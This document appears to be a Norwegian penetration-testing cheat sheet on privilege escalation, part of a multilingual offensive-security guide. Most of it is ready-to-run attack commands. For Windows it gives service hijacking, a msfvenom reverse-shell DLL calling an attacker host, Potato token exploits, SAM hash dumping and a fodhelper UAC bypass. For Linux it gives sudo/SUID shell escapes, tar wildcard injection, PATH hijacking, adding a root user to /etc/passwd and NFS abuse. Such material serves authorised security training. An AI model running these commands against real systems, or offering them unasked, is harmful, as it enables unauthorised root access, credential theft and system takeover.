# ⬆️ Fase 3: Rettighetseskalering

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Mål:** Eskalere rettigheter fra vanlig bruker til Administrator/SYSTEM (Windows) eller root (Linux).

> 📚 **Fullstendige veiledninger:** [Windows PrivEsc](../../Windows-PrivEsc/README.md) | [Linux PrivEsc](../../Linux-PrivEsc/README.md)

---

## 🖥️ Rettighetseskalering i Windows

### Raske muligheter – sjekk dette først
```cmd
# Sjekk gjeldende rettigheter
whoami /priv
whoami /groups

# Sjekk etter lagrede påloggingsopplysninger
cmdkey /list

# Filer for uovervåket installasjon
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Utnyttelse av tjenester

#### Tjenestesti uten anførselstegn
```cmd
# Finn stier uten anførselstegn
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Hvis du finner: C:\Program Files\Some Service\service.exe
# Plasser ondsinnet exe i: C:\Program.exe eller C:\Program Files\Some.exe
```

#### Svake tjenestetillatelser
```cmd
# Sjekk tjenestetillatelser med accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Hvis SERVICE_CHANGE_CONFIG er tilgjengelig:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL-kapring
```powershell
# Finn tjenester med manglende DLL-er (bruk Process Monitor)
# Plasser en ondsinnet DLL i tjenestens mappe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Identitetsutgivelse med tokens

#### SeImpersonatePrivilege (Potato-angrep)
```cmd
# Sjekk om du har SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Sikkerhetskopier SAM og SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Trekk ut hasher på angriperens maskin
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Utnyttelse av registeret
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Skrivbare stier for planlagte oppgaver
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Tillatelser i registeret
accesschk.exe -kvw hklm\SOFTWARE
```

### Omgåelse av UAC

> **Presisering:** UAC-eksemplet er ikke en generell vei fra standardbruker til administrator. Det avhenger av kontorettigheter, Windows-versjon og UAC-konfigurasjon.
```powershell
# Omgåelse med Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Automatiserte verktøy
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Rettighetseskalering i Linux

### Raske muligheter – sjekk dette først
```bash
# Sudo-tillatelser
sudo -l

# SUID-binærfiler
find / -perm -4000 -type f 2>/dev/null

# Skrivbar /etc/passwd
ls -la /etc/passwd

# Kjerneversjon for valg av exploits
uname -a
```

### Utnyttelse av sudo

#### Sudo uten passord
```bash
# Hvis sudo -l viser: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Hvis sudo -l viser: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Hvis sudo -l viser: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Utnyttelse av sårbar sudo-versjon (CVE-2021-3156)
```bash
# Sjekk sudo-versjonen
sudo --version

# Hvis sudo < 1.9.5p2
# Bruk exploit: https://github.com/blasty/CVE-2021-3156
```

### Binærfiler med SUID/SGID
```bash
# Finn SUID-binærfiler
find / -perm -4000 -type f 2>/dev/null

# Se GTFOBins for utnyttelsesmuligheter
# https://gtfobins.github.io/

# Eksempel: SUID på /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Eksempel: SUID på /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Eksempel: SUID på /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities (avgrensede Linux-rettigheter)
```bash
# Finn binærfiler med capabilities
getcap -r / 2>/dev/null

# Eksempel: cap_setuid på python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron-jobber
```bash
# Sjekk cron-jobber
cat /etc/crontab
ls -la /etc/cron.*

# Se etter skrivbare skript
# Injeksjon via jokertegn i tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### Kapring av PATH
```bash
# Hvis en cron-jobb eller et skript kaller en binærfil uten full sti
# Opprett en ondsinnet binærfil i en skrivbar mappe i PATH

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Skrivbar /etc/passwd

> **Merknad til originalen:** Hashen med `xyz...` er en plassholder, ikke et fullstendig resultat fra `openssl passwd`. Oppgitte versjonsintervaller for exploits er forenklede; distribusjonenes sikkerhetsoppdateringer og tilbakeporteringer må også vurderes.
```bash
# Hvis /etc/passwd er skrivbar
# Generer passordhash
openssl passwd -1 -salt evil password123

# Legg til en bruker med root-rettigheter
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Bytt til den nye brukeren med root-rettigheter
su evil
```

### Utnyttelse av kjernesårbarheter
```bash
# Sjekk kjerneversjonen
uname -r
cat /proc/version

# Søk etter exploits
searchsploit linux kernel 4.4 privilege escalation

# Vanlige exploits mot kjernen:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### Utnyttelse av NFS
```bash
# Sjekk etter no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Hvis no_root_squash er aktivert:
# Monter ressursen og opprett en SUID-binærfil som root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# På målmaskinen:
/mnt/bash -p
```

### Automatiserte verktøy
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Hurtigreferanse

### Sjekkliste for Windows
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup osv.)
- [ ] Tjenestestier uten anførselstegn
- [ ] Svake tjenestetillatelser
- [ ] AlwaysInstallElevated
- [ ] Lagrede påloggingsopplysninger (cmdkey /list)
- [ ] Unattend/Sysprep-filer
- [ ] Planlagte oppgaver
- [ ] Kjør WinPEAS/PowerUp
```

### Sjekkliste for Linux
```markdown
- [ ] sudo -l
- [ ] SUID-binærfiler (se GTFOBins)
- [ ] Capabilities
- [ ] Cron-jobber (skrivbare skript og jokertegn)
- [ ] Skrivbar /etc/passwd
- [ ] Kjerneversjon (exploits)
- [ ] NFS no_root_squash
- [ ] Kjør LinPEAS
```

---

## 🔗 Relaterte hurtigguider

- [Windows PrivEsc (fullstendig)](../../Windows-PrivEsc/README.md)
- [Linux PrivEsc (fullstendig)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Forrige fase:** [← 02 - Kartlegging](./02-Enumeration.nb.md)

**Neste fase:** [04 - Lateral bevegelse →](./04-Lateral-Movement.nb.md)
